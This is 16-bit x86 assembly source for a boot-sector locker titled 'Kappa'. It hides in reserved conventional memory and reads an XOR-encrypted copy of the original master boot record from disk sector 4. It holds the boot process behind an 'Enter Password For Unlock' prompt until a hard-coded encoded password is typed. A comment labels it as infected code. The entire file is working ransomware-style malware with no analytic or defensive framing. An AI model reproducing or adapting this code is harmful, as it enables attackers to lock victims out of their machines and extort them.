;Kappa
.386
LOCALS
org 7c00h
CODE SEGMENT USE16
ASSUME CS: CODE, DS: CODE, SS: CODE
START:
nop ;flag of infected
cli
xor ax, ax
mov ds, ax
mov sp, 0FFFFh
sub word ptr ds:413h, 1h
mov ax, ds:413h
sti

shl ax, 6

cld
mov es, ax
xor di, di
mov si, 7c00h
mov cx, 200h
rep movsb
push es
push offset @@read_orig
retf
;int13h
@@read_orig:
xor ax, ax
mov es, ax
mov dx, es
mov bx, 7c00h
mov ah, 2
mov al, 1
mov cx, 4 ;
mov dx, 80h
int 13h

mov cx, 200h
mov al, 90h
mov si, bx
@@decrypt:
xor byte ptr es:[si], al
inc si
loop @@decrypt
push es
push bx
@@password_loop:
mov ax, 3
int 10h

mov ah, 0Eh
mov bx, cs
mov ds, bx
mov es, bx
xor bx, bx
lea si, EnterPassword
@@passwd: ;displaying a password prompt
lodsb
test al, al
jz @@enter
int 10h
jmp @@passwd

lea si, password
@@enter:
xor ax, ax ;char input
int 16h

mov ah, 0Eh
int 10h ;show unlock text

xor al, 90h
cmp al, byte ptr cs:[si]
jnz @@password_loop

inc si
cmp byte ptr cs:[si], 0
jz @@stop_enter

jmp @@enter
@@stop_enter:
pop bx
pop es

push 0
push 7c00h
retf

OldSeg dw 0
OldOff dw 0

EnterPassword db 'Enter Password For Unlock: ',0
password db 0a1h, 0a2h, 0a3h, 0a4h, 0bdh, 0a1h, 0a2h, 0a3h, 0a4h, 0bdh, 0a1h, 0a2h, 0a3h, 0a4h, 0bdh, 0a1h, 0a2h, 0a3h, 0a4h, 0;1234-1234-1234-1234
times db 510-($-START) dup (0)
db 55h, 0AAh

CODE ENDS
END START
